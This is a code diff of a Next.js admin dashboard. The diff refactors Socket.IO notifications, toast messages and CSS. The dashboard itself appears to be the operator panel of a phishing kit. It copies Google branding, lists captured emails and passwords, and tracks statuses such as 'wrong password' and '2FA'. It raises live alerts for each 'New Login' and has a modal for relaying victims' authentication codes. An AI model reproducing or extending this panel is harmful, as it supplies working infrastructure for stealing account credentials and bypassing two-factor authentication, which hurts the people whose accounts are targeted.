@@ -2,8 +2,7 @@
 
 import React, { useState, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
-import toast from "react-hot-toast";
-import { useSocket } from "../../hooks/useSocket";
+import toast, { Toaster } from "react-hot-toast";
 import {
     adminLoginAction,
     adminLogoutAction,
@@ -20,6 +19,8 @@ export default function AdminPage() {
     const [isAuthenticated, setIsAuthenticated] = useState(false);
     const [loading, setLoading] = useState(true);
     const [users, setUsers] = useState([]);
+    const [socketConnected, setSocketConnected] = useState(false);
+    const [connectionError, setConnectionError] = useState("");
     const [summary, setSummary] = useState({
         pending: 0,
         wrongEmail: 0,
@@ -37,26 +38,125 @@ export default function AdminPage() {
     const [modalUserEmail, setModalUserEmail] = useState("");
     const [modalAuthCodeInput, setModalAuthCodeInput] = useState("");
     const [mounted, setMounted] = useState(false);
-    const [socketConnected, setSocketConnected] = useState(false);
 
-    const { socket, isConnected, connectionError } = useSocket();
     const authCodeInputRef = useRef(null);
+    const socketRef = useRef(null);
 
     useEffect(() => {
         setMounted(true);
-        setSocketConnected(isConnected);
-    }, [isConnected]);
+    }, []);
 
     // Auto focus on 2FA modal input
     useEffect(() => {
         if (show2FAModal && authCodeInputRef.current) {
             const timer = setTimeout(() => {
-                authCodeInputRef.current.focus();
-                authCodeInputRef.current.select();
+                authCodeInputRef.current?.focus();
+                authCodeInputRef.current?.select();
             }, 150);
             return () => clearTimeout(timer);
         }
     }, [show2FAModal]);
+
+    // Initialize Socket.IO
+    useEffect(() => {
+        if (!mounted) return;
+
+        let socketInstance = null;
+
+        const initSocket = async () => {
+            try {
+                const socketUrl = process.env.NEXT_PUBLIC_SOCKET_SERVER_URL || "http://localhost:1000";
+                const { io } = await import("socket.io-client");
+
+                socketInstance = io(socketUrl, {
+                    transports: ["websocket", "polling"],
+                    reconnection: true,
+                    reconnectionAttempts: 5,
+                    reconnectionDelay: 1000,
+                    timeout: 10000,
+                    path: "/socket.io/",
+                });
+
+                socketRef.current = socketInstance;
+
+                socketInstance.on("connect", () => {
+                    console.log("✅ Admin connected to socket server");
+                    setSocketConnected(true);
+                    setConnectionError("");
+                    // toast.success("Connected to real-time server",{
+                    //     duration: 1000
+                    // });
+                });
+
+                socketInstance.on("disconnect", (reason) => {
+                    console.log("❌ Admin disconnected from socket server:", reason);
+                    setSocketConnected(false);
+                    if (reason === "io server disconnect") {
+                        setConnectionError("Server disconnected");
+                    }
+                });
+
+                socketInstance.on("connect_error", (error) => {
+                    console.error("Socket connection error:", error.message);
+                    setSocketConnected(false);
+                    setConnectionError(error.message || "Connection failed");
+                });
+
+                socketInstance.on("admin_notification", (data) => {
+                    console.log("📨 Received admin_notification:", data);
+                    toast(`New Login: ${data.email || 'Unknown'}`, {
+                        duration: 5000,
+                        icon: '🔔',
+                        style: {
+                            borderRadius: '10px',
+                            background: '#333',
+                            color: '#fff',
+                        },
+                    });
+                    playNotificationSound();
+                    fetchUsers();
+                });
+
+                socketInstance.on("user_update", (data) => {
+                    console.log("📨 Received user_update on admin:", data);
+                    fetchUsers();
+                });
+
+                // Join as admin
+                socketInstance.emit("admin-joined", { name: "Admin" });
+
+            } catch (error) {
+                console.error("Failed to initialize socket:", error);
+                setConnectionError(error.message || "Failed to connect");
+            }
+        };
+
+        initSocket();
+
+        return () => {
+            if (socketInstance) {
+                socketInstance.off("connect");
+                socketInstance.off("disconnect");
+                socketInstance.off("connect_error");
+                socketInstance.off("admin_notification");
+                socketInstance.off("user_update");
+                socketInstance.disconnect();
+                socketRef.current = null;
+            }
+        };
+    }, [mounted]);
+
+    const playNotificationSound = () => {
+        try {
+            const audio = new Audio("/notification.wav");
+            audio.volume = 1;
+            audio.play().catch((err) => {
+                console.error("Sound play failed:", err);
+            });
+        } catch (e) {
+            console.error("Audio creation failed:", e);
+        }
+    };
 
     // Check session on mount
     useEffect(() => {
@@ -86,7 +186,9 @@ export default function AdminPage() {
             }
         } catch (error) {
             console.error("Failed to fetch users:", error);
-            toast.error("Failed to fetch users");
+            toast.error("Failed to fetch users", {
+                duration: 1000
+            });
         }
     };
 
@@ -124,41 +226,6 @@ export default function AdminPage() {
         setSummary(summaryData);
     };
 
-    const playNotificationSound = () => {
-        const audio = new Audio("notification.wav");
-        audio.volume = 1; // 0 থেকে 1
-        audio.play().catch((err) => {
-            console.error("Sound play failed:", err);
-        });
-    }
-
-    // Listen for socket events
-    useEffect(() => {
-        if (socket) {
-            const handleNotification = (data) => {
-
-                toast(`New Login: ${data.email || 'Unknown'}`, {
-                    duration: 5000,
-                    icon: '🔔',
-                    style: {
-                        borderRadius: '10px',
-                        background: '#333',
-                        color: '#fff',
-                    },
-                });
-
-                playNotificationSound();
-                fetchUsers();
-            };
-
-            socket.on("admin_notification", handleNotification);
-
-            return () => {
-                socket.off("admin_notification", handleNotification);
-            };
-        }
-    }, [socket]);
-
     // Handle admin login
     const handleAdminLogin = async (e) => {
         e.preventDefault();
@@ -175,7 +242,9 @@ export default function AdminPage() {
             if (result.success) {
                 setIsAuthenticated(true);
                 await fetchUsers();
-                toast.success("Logged in successfully!");
+                toast.success("Logged in successfully!", {
+                    duration: 1000
+                });
             } else {
                 setLoginError(result.message || "Invalid credentials");
             }
@@ -191,7 +260,9 @@ export default function AdminPage() {
         await adminLogoutAction();
         setIsAuthenticated(false);
         setUsers([]);
-        toast.success("Logged out successfully!");
+        toast.success("Logged out successfully!", {
+            duration: 1000
+        });
         router.refresh();
     };
 
@@ -202,12 +273,18 @@ export default function AdminPage() {
             const result = await updateUserStatus(userId, newStatus, authCode);
             if (result.success) {
                 await fetchUsers();
-                toast.success(`Status updated to ${newStatus}`);
+                toast.success(`Status updated to ${newStatus}`, {
+                    duration: 1000
+                });
             } else {
-                toast.error(result.message || "Failed to update status");
+                toast.error(result.message || "Failed to update status", {
+                    duration: 1000
+                });
             }
         } catch (error) {
-            toast.error("An error occurred. Please try again.");
+            toast.error("An error occurred. Please try again.", {
+                duration: 1000
+            });
         } finally {
             setActionLoading(false);
         }
@@ -221,12 +298,18 @@ export default function AdminPage() {
             const result = await deleteUser(userId);
             if (result.success) {
                 await fetchUsers();
-                toast.success("User deleted successfully!");
+                toast.success("User deleted successfully!", {
+                    duration: 1000
+                });
             } else {
-                toast.error(result.message || "Failed to delete user");
+                toast.error(result.message || "Failed to delete user", {
+                    duration: 1000
+                });
             }
         } catch (error) {
-            toast.error("An error occurred. Please try again.");
+            toast.error("An error occurred. Please try again.", {
+                duration: 1000
+            });
         } finally {
             setActionLoading(false);
         }
@@ -265,31 +348,31 @@ export default function AdminPage() {
                 <div className="loader"></div>
                 <p>Loading dashboard...</p>
                 <style>{`
-                    .loading-container {
-                        display: flex;
-                        flex-direction: column;
-                        align-items: center;
-                        justify-content: center;
-                        min-height: 100vh;
-                        background: #f8f9fa;
-                    }
-                    .loader {
-                        width: 48px;
-                        height: 48px;
-                        border: 4px solid #e8eaed;
-                        border-top-color: #1a73e8;
-                        border-radius: 50%;
-                        animation: spin 0.8s linear infinite;
-                    }
-                    @keyframes spin {
-                        to { transform: rotate(360deg); }
-                    }
-                    p {
-                        margin-top: 20px;
-                        color: #5f6368;
-                        font-size: 16px;
-                    }
-                `}</style>
+          .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background: #f8f9fa;
+          }
+          .loader {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #e8eaed;
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+          }
+          @keyframes spin {
+            to { transform: rotate(360deg); }
+          }
+          p {
+            margin-top: 20px;
+            color: #5f6368;
+            font-size: 16px;
+          }
+        `}</style>
             </div>
         );
     }
@@ -298,6 +381,7 @@ export default function AdminPage() {
     if (!isAuthenticated) {
         return (
             <div className="admin-login-container">
+                <Toaster position="top-right" />
                 <div className="admin-login-card">
                     <div className="brand-logo">
                         <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
@@ -341,115 +425,116 @@ export default function AdminPage() {
                 </div>
 
                 <style>{`
-                    .admin-login-container {
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                        min-height: 100vh;
-                        background: linear-gradient(135deg, #f8f9fa 0%, #e8eaed 100%);
-                        padding: 20px;
-                    }
-                    .admin-login-card {
-                        background: #ffffff;
-                        padding: 48px 40px;
-                        border-radius: 12px;
-                        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
-                        width: 100%;
-                        max-width: 400px;
-                        text-align: center;
-                    }
-                    .brand-logo {
-                        font-size: 28px;
-                        font-weight: 500;
-                        margin-bottom: 16px;
-                        letter-spacing: -0.5px;
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                    }
-                    .brand-logo span:nth-child(1) { color: #4285f4; }
-                    .brand-logo span:nth-child(2) { color: #ea4335; }
-                    .brand-logo span:nth-child(3) { color: #fbbc05; }
-                    .brand-logo span:nth-child(4) { color: #4285f4; }
-                    .brand-logo span:nth-child(5) { color: #34a853; }
-                    .brand-logo span:nth-child(6) { color: #ea4335; }
-                    h1 {
-                        font-size: 24px;
-                        font-weight: 400;
-                        color: #202124;
-                        margin-bottom: 4px;
-                    }
-                    .subtitle {
-                        color: #5f6368;
-                        font-size: 14px;
-                        margin-bottom: 32px;
-                    }
-                    .input-group {
-                        position: relative;
-                        margin-bottom: 20px;
-                        text-align: left;
-                    }
-                    .input-group input {
-                        width: 100%;
-                        padding: 16px;
-                        font-size: 16px;
-                        border: 1px solid #dadce0;
-                        border-radius: 4px;
-                        outline: none;
-                        background: transparent;
-                        transition: border-color 0.15s ease;
-                    }
-                    .input-group input:focus {
-                        border-color: #1a73e8;
-                        border-width: 2px;
-                        padding: 15px;
-                    }
-                    .input-group label {
-                        position: absolute;
-                        left: 16px;
-                        top: 50%;
-                        transform: translateY(-50%);
-                        background: #ffffff;
-                        padding: 0 4px;
-                        font-size: 16px;
-                        color: #757575;
-                        transition: 0.2s ease all;
-                        pointer-events: none;
-                    }
-                    .input-group input:focus ~ label,
-                    .input-group input:not(:placeholder-shown) ~ label {
-                        top: 0;
-                        font-size: 12px;
-                        color: #1a73e8;
-                    }
-                    .error-message {
-                        color: #d93025;
-                        font-size: 14px;
-                        margin: 12px 0;
-                        padding: 8px 12px;
-                        background: #fce8e6;
-                        border-radius: 4px;
-                    }
-                    .btn-login {
-                        width: 100%;
-                        background: #1a73e8;
-                        color: white;
-                        border: none;
-                        padding: 12px;
-                        font-size: 16px;
-                        font-weight: 500;
-                        border-radius: 4px;
-                        cursor: pointer;
-                        transition: background-color 0.15s;
-                    }
-                    .btn-login:hover {
-                        background: #1557b0;
-                    }
-                    .btn-login:disabled {
-                        opacity: 0.6;
-                        cursor: not-allowed;
-                    }
-                `}</style>
+          .admin-login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e8eaed 100%);
+            padding: 20px;
+          }
+          .admin-login-card {
+            background: #ffffff;
+            padding: 48px 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+          }
+          .brand-logo {
+            font-size: 28px;
+            font-weight: 500;
+            margin-bottom: 16px;
+            letter-spacing: -0.5px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+          }
+          .brand-logo span:nth-child(1) { color: #4285f4; }
+          .brand-logo span:nth-child(2) { color: #ea4335; }
+          .brand-logo span:nth-child(3) { color: #fbbc05; }
+          .brand-logo span:nth-child(4) { color: #4285f4; }
+          .brand-logo span:nth-child(5) { color: #34a853; }
+          .brand-logo span:nth-child(6) { color: #ea4335; }
+          h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 4px;
+          }
+          .subtitle {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 32px;
+          }
+          .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+          }
+          .input-group input {
+            width: 100%;
+            padding: 16px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            background: transparent;
+            transition: border-color 0.15s ease;
+          }
+          .input-group input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 15px;
+          }
+          .input-group label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #ffffff;
+            padding: 0 4px;
+            font-size: 16px;
+            color: #757575;
+            transition: 0.2s ease all;
+            pointer-events: none;
+          }
+          .input-group input:focus ~ label,
+          .input-group input:not(:placeholder-shown) ~ label {
+            top: 0;
+            font-size: 12px;
+            color: #1a73e8;
+          }
+          .error-message {
+            color: #d93025;
+            font-size: 14px;
+            margin: 12px 0;
+            padding: 8px 12px;
+            background: #fce8e6;
+            border-radius: 4px;
+          }
+          .btn-login {
+            width: 100%;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.15s;
+          }
+          .btn-login:hover {
+            background: #1557b0;
+          }
+          .btn-login:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+          }
+          .text-black { color: #000; }
+        `}</style>
             </div>
         );
     }
@@ -457,6 +542,7 @@ export default function AdminPage() {
     // Admin Dashboard
     return (
         <div className="dashboard-container">
+            <Toaster position="top-right" />
             <header className="dashboard-header">
                 <div className="header-left">
                     <div className="brand-logo-small">
@@ -641,325 +727,327 @@ export default function AdminPage() {
                         </div>
                     </div>
                     <style>{`
-                        .modal-backdrop { 
-                            position: fixed; 
-                            inset: 0; 
-                            display: flex; 
-                            align-items: center; 
-                            justify-content: center; 
-                            background: rgba(0,0,0,0.4); 
-                            z-index: 9999; 
-                        }
-                        .modal-card { 
-                            background: #fff; 
-                            padding: 24px; 
-                            border-radius: 10px; 
-                            width: 340px; 
-                            box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
-                            text-align: left; 
-                        }
-                        .modal-card h3 { 
-                            margin: 0 0 8px 0; 
-                            color: #202124;
-                        }
-                        .modal-card p { 
-                            color: #555; 
-                            margin-bottom: 16px; 
-                        }
-                        .modal-card input { 
-                            width: 100%; 
-                            padding: 12px; 
-                            margin-bottom: 16px; 
-                            border: 2px solid #ddd; 
-                            border-radius: 6px; 
-                            font-size: 16px;
-                            transition: border-color 0.3s;
-                        }
-                        .modal-card input:focus {
-                            border-color: #1a73e8;
-                            outline: none;
-                            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.2);
-                        }
-                        .modal-actions { 
-                            display: flex; 
-                            justify-content: flex-end; 
-                            gap: 8px; 
-                        }
-                        .btn-cancel { 
-                            background: #f1f3f4; 
-                            border: none; 
-                            padding: 8px 16px; 
-                            border-radius: 6px; 
-                            cursor: pointer; 
-                            font-weight: 500;
-                        }
-                        .btn-cancel:hover {
-                            background: #e8eaed;
-                        }
-                        .btn-confirm { 
-                            background: #1a73e8; 
-                            color: #fff; 
-                            border: none; 
-                            padding: 8px 16px; 
-                            border-radius: 6px; 
-                            cursor: pointer; 
-                            font-weight: 500;
-                        }
-                        .btn-confirm:hover {
-                            background: #1557b0;
-                        }
-                    `}</style>
+            .modal-backdrop { 
+              position: fixed; 
+              inset: 0; 
+              display: flex; 
+              align-items: center; 
+              justify-content: center; 
+              background: rgba(0,0,0,0.4); 
+              z-index: 9999; 
+            }
+            .modal-card { 
+              background: #fff; 
+              padding: 24px; 
+              border-radius: 10px; 
+              width: 340px; 
+              box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
+              text-align: left; 
+            }
+            .modal-card h3 { 
+              margin: 0 0 8px 0; 
+              color: #202124;
+            }
+            .modal-card p { 
+              color: #555; 
+              margin-bottom: 16px; 
+            }
+            .modal-card input { 
+              width: 100%; 
+              padding: 12px; 
+              margin-bottom: 16px; 
+              border: 2px solid #ddd; 
+              border-radius: 6px; 
+              font-size: 16px;
+              transition: border-color 0.3s;
+            }
+            .modal-card input:focus {
+              border-color: #1a73e8;
+              outline: none;
+              box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.2);
+            }
+            .modal-actions { 
+              display: flex; 
+              justify-content: flex-end; 
+              gap: 8px; 
+            }
+            .btn-cancel { 
+              background: #f1f3f4; 
+              border: none; 
+              padding: 8px 16px; 
+              border-radius: 6px; 
+              cursor: pointer; 
+              font-weight: 500;
+            }
+            .btn-cancel:hover {
+              background: #e8eaed;
+            }
+            .btn-confirm { 
+              background: #1a73e8; 
+              color: #fff; 
+              border: none; 
+              padding: 8px 16px; 
+              border-radius: 6px; 
+              cursor: pointer; 
+              font-weight: 500;
+            }
+            .btn-confirm:hover {
+              background: #1557b0;
+            }
+            .text-black { color: #000; }
+          `}</style>
                 </div>
             )}
 
             <style>{`
-                .dashboard-container {
-                    min-height: 100vh;
-                    background: #f8f9fa;
-                }
-                .dashboard-header {
-                    background: #ffffff;
-                    padding: 16px 32px;
-                    border-bottom: 1px solid #dadce0;
-                    display: flex;
-                    justify-content: space-between;
-                    align-items: center;
-                    position: sticky;
-                    top: 0;
-                    z-index: 100;
-                }
-                .header-left {
-                    display: flex;
-                    align-items: center;
-                    gap: 16px;
-                }
-                .brand-logo-small {
-                    font-size: 20px;
-                    font-weight: 500;
-                    letter-spacing: -0.5px;
-                    display: flex;
-                    align-items: center;
-                }
-                .brand-logo-small span:nth-child(1) { color: #4285f4; }
-                .brand-logo-small span:nth-child(2) { color: #ea4335; }
-                .brand-logo-small span:nth-child(3) { color: #fbbc05; }
-                .brand-logo-small span:nth-child(4) { color: #4285f4; }
-                .brand-logo-small span:nth-child(5) { color: #34a853; }
-                .brand-logo-small span:nth-child(6) { color: #ea4335; }
-                .header-title {
-                    font-size: 18px;
-                    font-weight: 500;
-                    color: #202124;
-                }
-                .connection-status {
-                    display: flex;
-                    align-items: center;
-                    gap: 4px;
-                    font-size: 12px;
-                    padding: 4px 12px;
-                    border-radius: 12px;
-                    background: #f1f3f4;
-                }
-                .connection-status.connected {
-                    color: #34a853;
-                }
-                .connection-status.disconnected {
-                    color: #ea4335;
-                }
-                .status-text {
-                    margin-left: 4px;
-                }
-                .btn-logout {
-                    background: #ea4335;
-                    color: white;
-                    border: none;
-                    padding: 8px 20px;
-                    border-radius: 4px;
-                    cursor: pointer;
-                    font-size: 14px;
-                    font-weight: 500;
-                    transition: background-color 0.15s;
-                }
-                .btn-logout:hover {
-                    background: #d33426;
-                }
-                .dashboard-content {
-                    max-width: 1400px;
-                    margin: 0 auto;
-                    padding: 24px;
-                }
-                .summary-grid {
-                    display: grid;
-                    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-                    gap: 16px;
-                    margin-bottom: 32px;
-                }
-                .summary-card {
-                    background: #ffffff;
-                    border-radius: 8px;
-                    padding: 16px 20px;
-                    display: flex;
-                    align-items: center;
-                    gap: 16px;
-                    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
-                    border-left: 4px solid #dadce0;
-                }
-                .summary-card.pending { border-left-color: #fbbc04; }
-                .summary-card.wrong-email { border-left-color: #ea4335; }
-                .summary-card.wrong-password { border-left-color: #ea4335; }
-                .summary-card.twofa { border-left-color: #4285f4; }
-                .summary-card.success { border-left-color: #34a853; }
-                .summary-card.total { border-left-color: #1a73e8; }
-                .summary-icon { font-size: 24px; }
-                .summary-info { display: flex; flex-direction: column; }
-                .summary-value { font-size: 24px; font-weight: 500; color: #202124; }
-                .summary-label { font-size: 12px; color: #5f6368; }
-                .table-container {
-                    background: #ffffff;
-                    border-radius: 8px;
-                    padding: 24px;
-                    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
-                }
-                .table-header {
-                    display: flex;
-                    justify-content: space-between;
-                    align-items: center;
-                    margin-bottom: 20px;
-                }
-                .table-header h2 {
-                    font-size: 18px;
-                    font-weight: 500;
-                    color: #202124;
-                }
-                .btn-refresh {
-                    background: #f1f3f4;
-                    border: none;
-                    padding: 6px 16px;
-                    border-radius: 4px;
-                    cursor: pointer;
-                    font-size: 14px;
-                    color: #202124;
-                    transition: background-color 0.15s;
-                }
-                .btn-refresh:hover {
-                    background: #e8eaed;
-                }
-                .table-responsive {
-                    overflow-x: auto;
-                }
-                table {
-                    width: 100%;
-                    border-collapse: collapse;
-                }
-                thead {
-                    background: #f8f9fa;
-                }
-                th {
-                    padding: 12px 16px;
-                    text-align: left;
-                    font-size: 12px;
-                    font-weight: 500;
-                    color: #5f6368;
-                    text-transform: uppercase;
-                    letter-spacing: 0.5px;
-                    border-bottom: 1px solid #dadce0;
-                }
-                td {
-                    padding: 12px 16px;
-                    font-size: 14px;
-                    color: #202124;
-                    border-bottom: 1px solid #f1f3f4;
-                }
-                tr:hover {
-                    background: #f8f9fa;
-                }
-                .email-cell {
-                    font-weight: 500;
-                }
-                .password-cell {
-                    font-family: monospace;
-                    color: #5f6368;
-                }
-                .status-badge {
-                    display: inline-block;
-                    padding: 4px 12px;
-                    border-radius: 12px;
-                    font-size: 12px;
-                    font-weight: 500;
-                    color: white;
-                }
-                .action-buttons {
-                    display: flex;
-                    gap: 8px;
-                    align-items: center;
-                }
-                .status-select {
-                    padding: 4px 8px;
-                    border: 1px solid #dadce0;
-                    border-radius: 4px;
-                    font-size: 12px;
-                    background: #ffffff;
-                    cursor: pointer;
-                }
-                .status-select:disabled {
-                    opacity: 0.6;
-                    cursor: not-allowed;
-                }
-                .btn-delete {
-                    background: none;
-                    border: none;
-                    cursor: pointer;
-                    font-size: 16px;
-                    padding: 4px 8px;
-                    border-radius: 4px;
-                    transition: background-color 0.15s;
-                }
-                .btn-delete:hover {
-                    background: #fce8e6;
-                }
-                .btn-delete:disabled {
-                    opacity: 0.4;
-                    cursor: not-allowed;
-                }
-                .empty-state {
-                    text-align: center;
-                    padding: 40px;
-                    color: #5f6368;
-                }
-                @media (max-width: 768px) {
-                    .dashboard-header {
-                        padding: 12px 16px;
-                        flex-direction: column;
-                        gap: 12px;
-                    }
-                    .dashboard-content {
-                        padding: 12px;
-                    }
-                    .summary-grid {
-                        grid-template-columns: repeat(2, 1fr);
-                    }
-                    .table-container {
-                        padding: 16px;
-                    }
-                    .table-header {
-                        flex-direction: column;
-                        gap: 12px;
-                        align-items: flex-start;
-                    }
-                    .action-buttons {
-                        flex-direction: column;
-                        gap: 4px;
-                    }
-                    .header-left {
-                        flex-wrap: wrap;
-                    }
-                }
-                @media (max-width: 480px) {
-                    .summary-grid {
-                        grid-template-columns: 1fr;
-                    }
-                }
-            `}</style>
+        .dashboard-container {
+          min-height: 100vh;
+          background: #f8f9fa;
+        }
+        .dashboard-header {
+          background: #ffffff;
+          padding: 16px 32px;
+          border-bottom: 1px solid #dadce0;
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          position: sticky;
+          top: 0;
+          z-index: 100;
+        }
+        .header-left {
+          display: flex;
+          align-items: center;
+          gap: 16px;
+        }
+        .brand-logo-small {
+          font-size: 20px;
+          font-weight: 500;
+          letter-spacing: -0.5px;
+          display: flex;
+          align-items: center;
+        }
+        .brand-logo-small span:nth-child(1) { color: #4285f4; }
+        .brand-logo-small span:nth-child(2) { color: #ea4335; }
+        .brand-logo-small span:nth-child(3) { color: #fbbc05; }
+        .brand-logo-small span:nth-child(4) { color: #4285f4; }
+        .brand-logo-small span:nth-child(5) { color: #34a853; }
+        .brand-logo-small span:nth-child(6) { color: #ea4335; }
+        .header-title {
+          font-size: 18px;
+          font-weight: 500;
+          color: #202124;
+        }
+        .connection-status {
+          display: flex;
+          align-items: center;
+          gap: 4px;
+          font-size: 12px;
+          padding: 4px 12px;
+          border-radius: 12px;
+          background: #f1f3f4;
+        }
+        .connection-status.connected {
+          color: #34a853;
+        }
+        .connection-status.disconnected {
+          color: #ea4335;
+        }
+        .status-text {
+          margin-left: 4px;
+        }
+        .btn-logout {
+          background: #ea4335;
+          color: white;
+          border: none;
+          padding: 8px 20px;
+          border-radius: 4px;
+          cursor: pointer;
+          font-size: 14px;
+          font-weight: 500;
+          transition: background-color 0.15s;
+        }
+        .btn-logout:hover {
+          background: #d33426;
+        }
+        .dashboard-content {
+          max-width: 1400px;
+          margin: 0 auto;
+          padding: 24px;
+        }
+        .summary-grid {
+          display: grid;
+          grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+          gap: 16px;
+          margin-bottom: 32px;
+        }
+        .summary-card {
+          background: #ffffff;
+          border-radius: 8px;
+          padding: 16px 20px;
+          display: flex;
+          align-items: center;
+          gap: 16px;
+          box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+          border-left: 4px solid #dadce0;
+        }
+        .summary-card.pending { border-left-color: #fbbc04; }
+        .summary-card.wrong-email { border-left-color: #ea4335; }
+        .summary-card.wrong-password { border-left-color: #ea4335; }
+        .summary-card.twofa { border-left-color: #4285f4; }
+        .summary-card.success { border-left-color: #34a853; }
+        .summary-card.total { border-left-color: #1a73e8; }
+        .summary-icon { font-size: 24px; }
+        .summary-info { display: flex; flex-direction: column; }
+        .summary-value { font-size: 24px; font-weight: 500; color: #202124; }
+        .summary-label { font-size: 12px; color: #5f6368; }
+        .table-container {
+          background: #ffffff;
+          border-radius: 8px;
+          padding: 24px;
+          box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+        }
+        .table-header {
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          margin-bottom: 20px;
+        }
+        .table-header h2 {
+          font-size: 18px;
+          font-weight: 500;
+          color: #202124;
+        }
+        .btn-refresh {
+          background: #f1f3f4;
+          border: none;
+          padding: 6px 16px;
+          border-radius: 4px;
+          cursor: pointer;
+          font-size: 14px;
+          color: #202124;
+          transition: background-color 0.15s;
+        }
+        .btn-refresh:hover {
+          background: #e8eaed;
+        }
+        .table-responsive {
+          overflow-x: auto;
+        }
+        table {
+          width: 100%;
+          border-collapse: collapse;
+        }
+        thead {
+          background: #f8f9fa;
+        }
+        th {
+          padding: 12px 16px;
+          text-align: left;
+          font-size: 12px;
+          font-weight: 500;
+          color: #5f6368;
+          text-transform: uppercase;
+          letter-spacing: 0.5px;
+          border-bottom: 1px solid #dadce0;
+        }
+        td {
+          padding: 12px 16px;
+          font-size: 14px;
+          color: #202124;
+          border-bottom: 1px solid #f1f3f4;
+        }
+        tr:hover {
+          background: #f8f9fa;
+        }
+        .email-cell {
+          font-weight: 500;
+        }
+        .password-cell {
+          font-family: monospace;
+          color: #5f6368;
+        }
+        .status-badge {
+          display: inline-block;
+          padding: 4px 12px;
+          border-radius: 12px;
+          font-size: 12px;
+          font-weight: 500;
+          color: white;
+        }
+        .action-buttons {
+          display: flex;
+          gap: 8px;
+          align-items: center;
+        }
+        .status-select {
+          padding: 4px 8px;
+          border: 1px solid #dadce0;
+          border-radius: 4px;
+          font-size: 12px;
+          background: #ffffff;
+          cursor: pointer;
+        }
+        .status-select:disabled {
+          opacity: 0.6;
+          cursor: not-allowed;
+        }
+        .btn-delete {
+          background: none;
+          border: none;
+          cursor: pointer;
+          font-size: 16px;
+          padding: 4px 8px;
+          border-radius: 4px;
+          transition: background-color 0.15s;
+        }
+        .btn-delete:hover {
+          background: #fce8e6;
+        }
+        .btn-delete:disabled {
+          opacity: 0.4;
+          cursor: not-allowed;
+        }
+        .empty-state {
+          text-align: center;
+          padding: 40px;
+          color: #5f6368;
+        }
+        .text-black { color: #000; }
+        @media (max-width: 768px) {
+          .dashboard-header {
+            padding: 12px 16px;
+            flex-direction: column;
+            gap: 12px;
+          }
+          .dashboard-content {
+            padding: 12px;
+          }
+          .summary-grid {
+            grid-template-columns: repeat(2, 1fr);
+          }
+          .table-container {
+            padding: 16px;
+          }
+          .table-header {
+            flex-direction: column;
+            gap: 12px;
+            align-items: flex-start;
+          }
+          .action-buttons {
+            flex-direction: column;
+            gap: 4px;
+          }
+          .header-left {
+            flex-wrap: wrap;
+          }
+        }
+        @media (max-width: 480px) {
+          .summary-grid {
+            grid-template-columns: 1fr;
+          }
+        }
+      `}</style>
         </div>
     );
 }
